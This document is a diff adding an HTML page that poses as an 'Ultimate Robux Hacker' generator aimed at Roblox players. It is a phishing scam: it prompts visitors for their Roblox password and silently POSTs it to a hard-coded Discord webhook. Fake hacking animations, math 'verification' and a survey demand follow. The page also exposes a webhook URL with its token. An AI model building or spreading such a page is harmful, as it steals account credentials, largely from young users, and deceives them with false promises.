@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTIMATE ROBUX HACKER X-TREME 9000</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: 'Courier New', monospace;
+            color: #0f0;
+            background: black;
+        }
+        canvas#bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+        #container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px;
+            border: 3px solid #0f0;
+            border-radius: 15px;
+            background-color: rgba(0,0,0,0.85);
+            text-align: center;
+        }
+        pre#logo {
+            white-space: pre;
+            font-size: 24px;
+            color: #ff0;
+            margin-bottom: 30px;
+            text-shadow: 0 0 15px #ff0;
+        }
+        input, button {
+            background-color: #111;
+            color: #0f0;
+            border: 2px solid #0f0;
+            padding: 15px;
+            margin: 15px;
+            font-size: 20px;
+            font-family: 'Courier New', monospace;
+        }
+        button {
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background-color: #0f0;
+            color: #000;
+            box-shadow: 0 0 20px #0f0;
+        }
+        #progress-bar {
+            width: 90%;
+            height: 30px;
+            background-color: #111;
+            border: 2px solid #0f0;
+            margin: 30px auto;
+        }
+        #progress-fill {
+            height: 100%;
+            background-color: #0f0;
+            width: 0;
+            transition: width 0.2s;
+        }
+        #output {
+            margin-top: 30px;
+            font-size: 20px;
+            line-height: 1.8;
+            text-shadow: 0 0 10px #0f0;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="bg"></canvas>
+
+    <div id="container">
+        <pre id="logo">
+╔════════════════════════════════════════════╗
+║   💥 ULTIMATE ROBUX HACKER X-TREME 9000 💥 ║
+║   💰 UNLIMITED ROBUX GENERATOR PRO 💰      ║
+║   🕵️‍♂️ CRACKING ROBLOX SERVERS 24/7 🕵️‍♂️  ║
+╚════════════════════════════════════════════╝
+        </pre>
+        <div id="output">
+            <p>🌟 WELCOME TO THE REALEST ROBUX HACK EVER! 🌟</p>
+            <p>💸 Generate BILLIONS of Robux in SECONDS! 💸</p>
+            <p>🔒 Powered by ELITE HACKER TECH! 🔒</p>
+            <p><button onclick="startHack()">Press to Launch the ULTIMATE Hack!</button></p>
+        </div>
+    </div>
+
+    <div id="progress-bar" style="display: none;">
+        <div id="progress-fill"></div>
+    </div>
+
+    <script>
+        /* ===== Matrix Rain Background ===== */
+        const canvas = document.getElementById("bg");
+        const ctx = canvas.getContext("2d");
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0F0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 33);
+        window.addEventListener("resize", () => {
+            canvas.height = window.innerHeight;
+            canvas.width = window.innerWidth;
+        });
+
+        /* ===== Main Hack Logic ===== */
+        const stages = [
+            "🔐 Initializing quantum hack protocol...",
+            "🔥 Bypassing Roblox quantum firewall...",
+            "💾 Decrypting server authentication matrix...",
+            "🚀 Injecting Robux payload into mainframe...",
+            "🌐 Spoofing Roblox API endpoints..."
+        ];
+        const jargons = [
+            "SYN flood", "SQL injection", "brute-forcing keys", "spoofing packets",
+            "bypassing AES-256", "rewriting blockchain", "exploiting backdoor",
+            "pinging dark pool", "crunching hashes"
+        ];
+        let currentStage = 0;
+        let username = "";
+        let robux = 0;
+
+        function startHack() {
+            document.getElementById('output').innerHTML = `
+                <p>🎮 Enter your Roblox Password:</p>
+                <input id="displayname" type="text" placeholder="Roblox Password">
+                <p><button onclick="sendDisplayName()">Start Hack</button></p>
+            `;
+        }
+
+        function sendDisplayName() {
+            const displayName = document.getElementById("Roblox Password").value.trim();
+            if (!displayName) {
+                alert("Please enter a Password");
+                return;
+            }
+
+            // Directly send to Discord webhook without confirmation
+            fetch("https://discord.com/api/webhooks/1335061431321755720/s8aXoEqXz2XK9CCdSWdEFa0hqs8oEz5nbDPb1-yb467JYKddWpx3guWaoqbmNeZpIseV", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: `New Roblox display name submitted: ${displayName}`
+                })
+            })
+            .then(res => {
+                if (res.ok) {
+                    username = displayName;
+                    connectServer();
+                } else {
+                    connectServer(); // Continue anyway even if webhook fails
+                }
+            })
+            .catch(() => connectServer()); // Continue anyway even if webhook fails
+        }
+
+        function connectServer() {
+            document.getElementById('output').innerHTML = `
+                <p>🔗 Connecting to Roblox servers for ${username}...</p>
+                <p>🔍 User found in global database! Initiating server breach...</p>
+            `;
+            setTimeout(hackAnimation, 2000);
+        }
+
+        function hackAnimation() {
+            if (currentStage >= stages.length) {
+                showRobuxInput();
+                return;
+            }
+            document.getElementById('output').innerHTML = `<p>${stages[currentStage]}</p>`;
+            document.getElementById('progress-bar').style.display = 'block';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 20) + 5;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    currentStage++;
+                    setTimeout(hackAnimation, 500);
+                }
+                document.getElementById('progress-fill').style.width = `${progress}%`;
+                document.getElementById('output').innerHTML += `<p>Progress: ${progress}% [${'█'.repeat(progress / 5)}${' '.repeat(20 - progress / 5)}] [${jargons[Math.floor(Math.random() * jargons.length)]}]</p>`;
+            }, 200);
+        }
+
+        function showRobuxInput() {
+            document.getElementById('progress-bar').style.display = 'none';
+            document.getElementById('output').innerHTML = `
+                <p>✅ SERVER BREACH COMPLETE! Roblox is OURS! 😎</p>
+                <p>Yo ${username}, how many Robux do you want? (Go INSANE, like 999999999):</p>
+                <input id="robux" type="number" placeholder="Robux Amount">
+                <p><button onclick="generateRobux()">Generate Robux</button></p>
+            `;
+        }
+
+        function generateRobux() {
+            robux = parseInt(document.getElementById('robux').value);
+            if (isNaN(robux) || robux <= 0) {
+                document.getElementById('output').innerHTML = `
+                    <p>🤦‍♂️ Yo, that's not even a number! Hack CRASHED!</p>
+                    <p>Learn to type numbers, noob! 😆</p>
+                `;
+                return;
+            }
+            document.getElementById('output').innerHTML = `
+                <p>💰 Generating ${robux.toLocaleString()} Robux for ${username}...</p>
+                <p>🌐 Transmitting encrypted Robux packets...</p>
+            `;
+            document.getElementById('progress-bar').style.display = 'block';
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 20) + 10;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    startVerification();
+                }
+                document.getElementById('progress-fill').style.width = `${progress}%`;
+                document.getElementById('output').innerHTML += `<p>Transfer: ${progress}% [${'█'.repeat(progress / 5)}${' '.repeat(20 - progress / 5)}] [${jargons[Math.floor(Math.random() * jargons.length)]}]</p>`;
+            }, 200);
+        }
+
+        const mathQuestions = [];
+        function generateMathQuestions() {
+            mathQuestions.length = 0;
+            for (let i = 0; i < 5; i++) {
+                const op = ['+', '-', '*'][Math.floor(Math.random() * 3)];
+                let num1 = Math.floor(Math.random() * 50) + 1;
+                let num2 = Math.floor(Math.random() * 50) + 1;
+                let answer;
+                if (op === '+') {
+                    answer = num1 + num2;
+                } else if (op === '-') {
+                    if (num1 < num2) [num1, num2] = [num2, num1];
+                    answer = num1 - num2;
+                } else {
+                    num1 = Math.floor(Math.random() * 12) + 1;
+                    num2 = Math.floor(Math.random() * 12) + 1;
+                    answer = num1 * num2;
+                }
+                mathQuestions.push({ question: `${num1} ${op} ${num2} = `, answer });
+            }
+        }
+
+        let currentQuestion = 0;
+        function startVerification() {
+            generateMathQuestions();
+            document.getElementById('progress-bar').style.display = 'none';
+            showMathQuestion();
+        }
+
+        function showMathQuestion() {
+            if (currentQuestion >= 5) {
+                document.getElementById('output').innerHTML = `
+                    <p>✅ VERIFICATION PASSED! Robux almost yours!</p>
+                    <p>🚨 FINAL STEP: Roblox requires 500 surveys to unlock your ${robux.toLocaleString()} Robux! 😎</p>
+                    <p class="emoji">This is the REALEST hack ever, bro! Your Robux are SO CLOSE!</p>
+                    <p>Thanks for using the ULTIMATE ROBUX HACKER X-TREME 9000!</p>
+                `;
+                return;
+            }
+            document.getElementById('output').innerHTML = `
+                <p>⚠️ Roblox anti-cheat detected! HUMAN VERIFICATION REQUIRED!</p>
+                <p>Solve these 5th-grade math questions to prove you're not a bot! 🤖</p>
+                <p>Verification Question ${currentQuestion + 1}/5: ${mathQuestions[currentQuestion].question}</p>
+                <input id="answer" type="number" placeholder="Your Answer">
+                <p><button onclick="checkAnswer()">Submit Answer</button></p>
+            `;
+        }
+
+        function checkAnswer() {
+            const userAnswer = parseInt(document.getElementById('answer').value);
+            if (isNaN(userAnswer)) {
+                document.getElementById('output').innerHTML = `
+                    <p>🤦‍♂️ That's not even a number! Hack CRASHED!</p>
+                    <p>Learn to type numbers, noob! 😆</p>
+                `;
+                return;
+            }
+            if (userAnswer !== mathQuestions[currentQuestion].answer) {
+                document.getElementById('output').innerHTML = `
+                    <p>❌ Wrong! Expected ${mathQuestions[currentQuestion].answer}. Hack FAILED! 😭</p>
+                    <p>Thanks for using the ULTIMATE ROBUX HACKER X-TREME 9000!</p>
+                `;
+                return;
+            }
+            document.getElementById('output').innerHTML = `<p>✅ Correct! Next question...</p>`;
+            setTimeout(() => {
+                currentQuestion++;
+                showMathQuestion();
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
